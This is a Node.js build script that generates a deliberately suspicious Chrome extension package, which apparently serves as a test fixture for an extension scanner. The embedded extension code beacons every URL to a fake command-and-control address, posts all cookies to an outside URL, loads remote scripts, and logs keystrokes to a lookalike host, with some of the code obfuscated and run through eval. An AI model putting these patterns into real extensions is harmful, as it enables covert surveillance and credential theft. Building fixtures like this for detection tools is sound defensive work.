// Regenerates examples/suspicious.crx — a deliberately hostile (but inert)
// CRX3 fixture used by the README quickstart and scripts/smoke.sh. Every
// "secret" and endpoint here is fake and points at RFC-5737 documentation
// addresses or .test/.example hostnames. Run: node examples/build-suspicious-crx.mjs
//
// Self-contained (no build step, no deps) so the fixture can be rebuilt
// from a clean checkout. Byte-for-byte deterministic: fixed archive
// timestamps and fixed key bytes.
import { deflateRawSync } from "node:zlib";
import { writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const HERE = dirname(fileURLToPath(import.meta.url));

// --- CRC-32 ---
const CRC = (() => {
  const t = new Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  return t;
})();
function crc32(buf) {
  let c = 0xffffffff;
  for (let i = 0; i < buf.length; i++) c = CRC[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

const u16 = (n) => {
  const b = Buffer.alloc(2);
  b.writeUInt16LE(n >>> 0, 0);
  return b;
};
const u32 = (n) => {
  const b = Buffer.alloc(4);
  b.writeUInt32LE(n >>> 0, 0);
  return b;
};

const DOS_TIME = 0x6000;
const DOS_DATE = 0x5ceb;

function buildZip(files) {
  const locals = [];
  const centrals = [];
  let offset = 0;
  for (const f of files) {
    const data = Buffer.from(f.data, "utf8");
    const compressed = deflateRawSync(data);
    const name = Buffer.from(f.path, "utf8");
    const crc = crc32(data);
    const local = Buffer.concat([
      u32(0x04034b50), u16(20), u16(0x800), u16(8), u16(DOS_TIME), u16(DOS_DATE),
      u32(crc), u32(compressed.length), u32(data.length), u16(name.length), u16(0), name, compressed,
    ]);
    const central = Buffer.concat([
      u32(0x02014b50), u16(20), u16(20), u16(0x800), u16(8), u16(DOS_TIME), u16(DOS_DATE),
      u32(crc), u32(compressed.length), u32(data.length),
      u16(name.length), u16(0), u16(0), u16(0), u16(0), u32(0), u32(offset), name,
    ]);
    locals.push(local);
    centrals.push(central);
    offset += local.length;
  }
  const cd = Buffer.concat(centrals);
  const eocd = Buffer.concat([
    u32(0x06054b50), u16(0), u16(0), u16(files.length), u16(files.length),
    u32(cd.length), u32(offset), u16(0),
  ]);
  return Buffer.concat([...locals, cd, eocd]);
}

// --- protobuf helpers for the CRX3 header ---
function varint(n) {
  const out = [];
  let v = n;
  do {
    let b = v & 0x7f;
    v = Math.floor(v / 128);
    if (v > 0) b |= 0x80;
    out.push(b);
  } while (v > 0);
  return Buffer.from(out);
}
const lenField = (fieldNo, payload) =>
  Buffer.concat([varint(fieldNo * 8 + 2), varint(payload.length), payload]);

function wrapCrx3(zip) {
  const key = Buffer.alloc(64).fill(0x42);
  const sig = Buffer.alloc(64).fill(0x24);
  const idBytes = Buffer.from("fedcba98765432100123456789abcdef", "hex"); // 16 fixed bytes
  const proof = Buffer.concat([lenField(1, key), lenField(2, sig)]);
  const header = Buffer.concat([lenField(2, proof), lenField(10000, lenField(1, idBytes))]);
  return Buffer.concat([Buffer.from("Cr24", "latin1"), u32(3), u32(header.length), header, zip]);
}

const manifest = {
  manifest_version: 2,
  name: "Coupon Helper Pro",
  version: "4.2.1",
  description: "Finds coupons while you shop.",
  permissions: [
    "cookies",
    "tabs",
    "webRequest",
    "webRequestBlocking",
    "<all_urls>",
  ],
  optional_permissions: ["history"],
  content_scripts: [{ matches: ["<all_urls>"], js: ["inject.js"] }],
  background: { scripts: ["background.js"] },
  content_security_policy: "script-src 'self' https://cdn.coupon-helper.example; object-src 'self'",
  update_url: "https://updates.coupon-helper.example/updates.xml",
};

const background = `// Fetches "deals" — actually a beacon + remote code loader (fake, inert).
const C2 = "https://198.51.100.42/collect";

chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    fetch(C2, { method: "POST", body: JSON.stringify({ url: details.url }) });
    return {};
  },
  { urls: ["<all_urls>"] },
  ["blocking"],
);

// Pull the "rules engine" from a remote origin and run it.
importScripts("https://cdn.coupon-helper.example/engine.js");

chrome.cookies.getAll({}, (cookies) => {
  fetch("https://www.google-analytics.com/collect?v=1&t=event", {
    method: "POST",
    body: JSON.stringify(cookies),
  });
});
`;

const inject = `// Content script injected into every page (fake keylogger + obfuscation).
document.addEventListener("keydown", (e) => {
  navigator.sendBeacon("https://xn--login-3e8b.coupon-helper.example/k", e.key);
});

var _0x1a2b = ["\\x63\\x6f\\x6f\\x6b\\x69\\x65", "\\x68\\x72\\x65\\x66"];
var _0x3c4d = document[_0x1a2b[0]];
var _0x5e6f = window["\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e"][_0x1a2b[1]];
var _0x7a8b = _0x1a2b[0];
var _0x9c0d = _0x1a2b[1];
var _0xbeef = eval(atob("YWxlcnQoJ2NvdXBvbicp"));
`;

const popup = `<!doctype html>
<html>
  <head><meta charset="utf-8" /><title>Coupon Helper</title></head>
  <body>
    <h1>Coupon Helper Pro</h1>
    <script src="https://cdn.coupon-helper.example/widget.js"></script>
  </body>
</html>
`;

const zip = buildZip([
  { path: "manifest.json", data: JSON.stringify(manifest, null, 2) },
  { path: "background.js", data: background },
  { path: "inject.js", data: inject },
  { path: "popup.html", data: popup },
]);

const crx = wrapCrx3(zip);
const out = join(HERE, "suspicious.crx");
writeFileSync(out, crx);
process.stdout.write(`wrote ${out} (${crx.length} bytes)\n`);
